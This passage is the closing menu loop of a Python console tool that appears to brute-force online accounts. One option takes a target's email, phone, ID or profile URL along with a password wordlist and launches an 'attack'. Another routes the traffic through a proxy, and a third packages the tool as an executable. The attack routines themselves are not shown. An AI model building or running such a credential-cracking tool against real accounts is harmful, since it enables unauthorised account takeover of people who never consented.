        
        elif ch == '3':
            banner()
            u = input(f"\n{C.Y}Use URL to find ID? (y/N): {C.R}").strip().lower()
            target = None
            if u == 'y':
                url = input(f"{C.Y}URL: {C.R}").strip()
                if url:
                    target = finder.find_id(url)
            if not target:
                target = input(f"{C.Y}Target (email/phone/ID): {C.R}").strip()
            wl = input(f"{C.Y}Wordlist path: {C.R}").strip()
            if target and wl and os.path.exists(wl):
                if tester.net_ok():
                    tester.attack(target, wordlist=wl)
            input(f"\n{C.BK}Press Enter...{C.R}")
        
        elif ch == '4':
            banner()
            proxy = input(f"\n{C.Y}Proxy (IP:PORT): {C.R}").strip()
            if proxy:
                if ':' not in proxy:
                    proxy += ':8080'
                if tester.proxy_ok(proxy):
                    tester.proxy = proxy
                    tester.br.set_proxies({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
                    print(f"{C.BG}✅ OK!{C.R}")
                else:
                    print(f"{C.BR}❌ Failed!{C.R}")
            input(f"\n{C.BK}Press Enter...{C.R}")
        
        elif ch == '5':
            banner()
            build_exe()
            input(f"\n{C.BK}Press Enter...{C.R}")
        
        elif ch == '6':
            print(f"\n{C.BG}👋 Goodbye!{C.R}\n")
            sys.exit(0)

if __name__ == '__main__':
    try:
        import signal
        signal.signal(signal.SIGINT, lambda x, y: sys.exit(0))
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C.BY}👋 Bye!{C.R}\n")
        sys.exit(0)
